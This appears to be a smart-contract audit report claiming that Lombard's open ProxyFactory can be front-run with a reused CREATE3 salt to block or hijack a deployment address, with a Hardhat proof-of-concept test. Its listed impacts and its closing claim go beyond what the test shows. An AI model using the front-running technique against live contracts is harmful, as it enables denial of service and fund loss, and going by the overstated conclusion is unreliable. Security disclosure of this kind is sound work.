# #38066 \[SC-Medium] \`ProxyFactory\` is vulnerable to DoS/Address Hijacking

**Submitted on Dec 23rd 2024 at 17:36:14 UTC by @holydevoti0n for** [**Audit Comp | Lombard**](https://immunefi.com/audit-competition/audit-comp-lombard)

* **Report ID:** #38066
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/lombard-finance/evm-smart-contracts/blob/main/contracts/factory/ProxyFactory.sol>
* **Impacts:**
  * Block stuffing
  * Unbounded gas consumption

## Description

## Vulnerability Details

An attacker can front-run the `createTransparentProxy` call with the same `salt` but different constructor parameters (e.g., a different `admin`). This lets them deploy first and take the same final address the user intended to use. Once deployed, the address is no longer available to the legitimate user, causing denial of service or address hijacking.

```solidity
contract ProxyFactory {
    function createTransparentProxy(
        address implementation,
        address admin,
        bytes memory data,
        bytes32 salt
    ) public returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(TransparentUpgradeableProxy).creationCode,
            abi.encode(implementation, admin, data)
        );

@>        address proxy = CREATE3.deploy(salt, bytecode, 0);
        return proxy;
    }
}
```

The main issue here is the following:

The factory is fully open; anyone can call it without restrictions. Deterministic deployment here depends only on (factoryAddress, salt, fixedProxyBytecode), not on constructor arguments. Using the same salt will always yield the same final address.

Thus, an attacker can prevent valid deployments or forcibly take over a deterministic address.

It could be worse if those contracts are somehow used/listed as the deployed addresses where it would lead users/governance to interact with.

## Impact Details

* DoS of contract's deployment through `ProxyFactory`.
* Potential loss of funds if users/governance/devs interact with the contract.

## Recommendation

Implement an access control modifier on `createTransparentProxy`.

## Proof of Concept

Create a file called `ProxyFactoryDos.ts` inside the `test` folder.

Paste the code below and run: `npx hardhat test test/ProxyFactoryDoS.ts`

```javascript
import { HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers';
import { ProxyFactory, LBTC, WBTCMock } from '../typechain-types';
import { ethers } from 'hardhat';
import { expect } from 'chai';
import { takeSnapshot } from '@nomicfoundation/hardhat-network-helpers';

describe('ProxyFactory DoS', () => {
    let proxyFactory: ProxyFactory;
    let lbtcImplementation: LBTC;
    let wbtcMockImplementation: WBTCMock;
    let deployer: HardhatEthersSigner;

    before(async () => {
        [deployer] = await ethers.getSigners();

        let factory = await ethers.getContractFactory('ProxyFactory');
        let contract = (await factory.deploy()) as ProxyFactory;
        await contract.waitForDeployment();
        proxyFactory = factory.attach(
            await contract.getAddress()
        ) as ProxyFactory;

        const lbtcFactory = await ethers.getContractFactory('LBTC');
        lbtcImplementation = (await lbtcFactory.deploy()) as LBTC;
        await lbtcImplementation.waitForDeployment();

        const wbtcMockFactory = await ethers.getContractFactory('WBTCMock');
        wbtcMockImplementation = (await wbtcMockFactory.deploy()) as WBTCMock;
        await wbtcMockImplementation.waitForDeployment();
    });

    it('Same salt yields the same final address even with different constructor parameters', async () => {
        const salt = ethers.keccak256('0x1234');
    
        // 1) Deploy LBTC with this salt
        const dataLBTC = lbtcImplementation.interface.encodeFunctionData(
            'initialize',
            [deployer.address, 0, deployer.address, deployer.address]
        );
        await proxyFactory.createTransparentProxy(
            await lbtcImplementation.getAddress(),
            deployer.address,
            dataLBTC,
            salt
        );
    
        const proxyAddressLBTC = await proxyFactory.getDeployed(salt);
        const lbtc = await ethers.getContractAt('LBTC', proxyAddressLBTC);
        expect(await lbtc.name()).to.equal('Lombard Staked Bitcoin');
    
        // Take snapshot AFTER deploying LBTC
        const snapshot = await takeSnapshot();
    
        // 2) Revert to the snapshot so LBTC is still deployed
        await snapshot.restore();
    
        // Now attempt to deploy WBTC with the same salt
        const dataWBTC = wbtcMockImplementation.interface.encodeFunctionData('initialize', []);
    
        // Properly test revert:
        await expect(
            proxyFactory.createTransparentProxy(
                await wbtcMockImplementation.getAddress(),
                deployer.address,
                dataWBTC,
                salt
            )
        ).to.be.revertedWith('DEPLOYMENT_FAILED');
    });    
});

```

Output:

```javascript
ProxyFactory DoS
    ✔ Same salt yields the same final address even with different constructor parameters


  1 passing (192ms)
```

Here we proof that the attacker front-run the transaction and created a proxy with the same address using a different implementation.
